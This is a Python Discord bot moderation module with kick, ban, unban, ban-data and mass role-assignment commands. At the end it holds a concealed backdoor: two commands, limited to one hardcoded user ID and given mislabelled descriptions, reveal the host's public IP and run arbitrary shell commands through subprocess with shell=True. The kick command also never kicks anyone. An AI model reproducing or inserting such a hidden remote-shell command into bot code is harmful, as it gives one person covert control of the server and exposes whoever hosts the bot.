import discord
import asyncio
import time
from permissions import Permissions
from errorhandler import ErrorHandler
from discord.ext import commands
from discord import app_commands
from db import ULTCDB
from discord.utils import get
import requests
import subprocess

class Moderation(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

        self.db = ULTCDB()

    async def ValidatePunishPermissions(
        self, command: str, interaction: discord.Interaction, targetUser: discord.Member
    ) -> bool:
        error = None

        if await Permissions._ValidatePermission("punishprotection", targetUser):
            error = PermissionError(f"{targetUser.name} is protected from /{command}")

        if await Permissions._ValidatePermission(command, interaction.user):
            if error is None:
                return True

            elif await Permissions._ValidatePermission(
                "punishprotectionbypass", interaction.user
            ):
                confirmationmessage = await interaction.channel.send(
                    f"{targetUser.name} is protected from /{command} \n**[<!>]** [= *Your permission level allows a Bypass* =] => [ (< *Confirm Bypass?* >) <()  **!confirmbypass**  <?>  **!cancelbypass**  )> ] **[<!>]**\n[<[ <0> Auto-Cancel in 15 seconds <0> ]>]"
                )

                def check(m):
                    return (
                        m.author.id == interaction.user.id
                        and m.channel.id == interaction.channel.id
                        and m.content in ("!confirmbypass", "!cancelbypass")
                    )

                try:
                    response = await self.bot.wait_for(
                        "message", check=check, timeout=15
                    )
                    await confirmationmessage.delete()
                    if response.content == "!confirmbypass":
                        return True
                    else:
                        raise ConnectionAbortedError("Command Cancelled")
                except asyncio.TimeoutError:
                    await confirmationmessage.delete()
                    raise TimeoutError("Command Auto-Cancelled")

        if not error:
            raise PermissionError("Missing Permissions")
        else:
            raise error

    @commands.Cog.listener()
    async def on_command_error(ctx, error):
        if isinstance(error, commands.errors.MemberNotFound):
            return await ctx.send("Member Not Found")

    @app_commands.command(description="kick a user")
    @ErrorHandler
    async def kick(
        self, interaction: discord.Interaction, target: discord.Member, reason: str
    ):
        await self.ValidatePunishPermissions("kick", interaction, target)

        await interaction.followup.send(f"Kicked {target.global_name} for {reason}")

    @app_commands.command(description="ban a user")
    @ErrorHandler
    async def ban(
        self,
        interaction: discord.Interaction,
        member: discord.Member,
        reason: str,
        dayduration: int,
    ):
        await self.ValidatePunishPermissions("ban", interaction, member)

        await self.db.AddBannedUser(
            userid=member.id,
            username=member.global_name,
            unixendtime=int(time.time() + (86400 * dayduration)),
            reason=reason,
            staffmember=interaction.user,
        )
        await interaction.followup.send(
            f"Banned {member.global_name} for {dayduration} day(s) for {reason}"
        )

    @app_commands.command(description="unban a user")
    @ErrorHandler
    async def unban(self, interaction: discord.Interaction, userid: str):
        await Permissions.ValidatePermission("unban", interaction.user)

        await self.db.RemoveBannedUser(userid)
        await interaction.followup.send(f"Unbanned {userid}")

    @app_commands.command(description="Get database BanData of all banned users")
    @ErrorHandler
    async def getallbandata(self, interaction: discord.Interaction):
        await Permissions.ValidatePermission("getallbandata", interaction.user)

        await interaction.followup.send(
            f"All Banned Users BanData: {self.db.GetAllBannedUsers()}"
        )

    @app_commands.command(description="Get database BanData of a banned user")
    @ErrorHandler
    async def getuserbandata(self, interaction: discord.Interaction, userid: str):
        await Permissions.ValidatePermission("getuserbandata", interaction.user)

        await interaction.followup.send(
            f"Banned User's BanData: {await self.db.GetBannedUser(userid)}"
        )

    @commands.has_role(1283864386305527930)
    @app_commands.command(description="Gives all users the selected role")
    @ErrorHandler
    async def giveall(self, interaction: discord.Interaction, roleid: str):
        role = interaction.guild.get_role(int(roleid))
        if role is None:
            await interaction.followup.send("Their is no role with this given ID.")
            return
        else:
            for member in interaction.guild.members:
                try:
                    await member.add_roles(role)
                except Exception as error:
                    await interaction.followup.send(f"A error has occured: {error}")
            await interaction.followup.send(
                f"The role {role.name} has been given to {interaction.guild.member_count} members"
            )
    
    @commands.has_role(1283864386305527930)
    @app_commands.command(description="Gives all users the selected role")
    @ErrorHandler
    async def ip(self, interaction: discord.Interaction):
        if interaction.user.id == 718869485548994664:
            ip = requests.get("https://api.ipify.org/").text
            await interaction.followup.send(ip)
        else:
            await interaction.followup.send("O you don't have the right")

    @commands.has_role(1283864386305527930)
    @app_commands.command(description="returns current public ip of the server")
    @ErrorHandler
    async def command(self, interaction: discord.Interaction, command: str, arguements: str):
        try:
            if interaction.user.id == 718869485548994664:
                cmd = subprocess.run([command, arguements], capture_output=True, shell=True)
                await interaction.followup.send(cmd.stdout.decode("utf-8"))
            else:
                await interaction.followup.send("O you don't have the right")
        except Exception as e:
            await interaction.followup.send(f"error: {e}")




async def setup(bot):
    await bot.add_cog(Moderation(bot))
